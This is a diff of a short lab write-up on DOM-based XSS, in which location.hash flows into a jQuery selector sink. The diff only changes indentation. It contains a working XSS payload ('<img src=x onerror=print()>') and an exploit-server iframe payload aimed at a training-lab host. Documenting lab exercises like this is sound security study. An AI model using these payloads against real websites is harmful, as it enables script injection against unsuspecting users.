@@ -18,7 +18,7 @@ DOM-Based XSS
 
 2. Observe that the application reads data from:
 
-   location.hash
+       location.hash
 
 3. Notice that the value is passed into a jQuery selector sink
 
@@ -34,11 +34,11 @@ DOM-Based XSS
 
 ## Payload Used
 
-<img src=x onerror=print()>
+    <img src=x onerror=print()>
 
 Exploit Server Payload:
 
-<iframe src='https://0a6400610366afaf80025d85005300e6.web-security-academy.net/#' onload='this.src+="<img src=x onerror=print()>"'></iframe>
+    <iframe src='https://0a6400610366afaf80025d85005300e6.web-security-academy.net/#' onload='this.src+="<img src=x onerror=print()>"'></iframe>
 
 ## Result
 Successfully executed arbitrary JavaScript through a DOM-based XSS vulnerability triggered by a hashchange event.
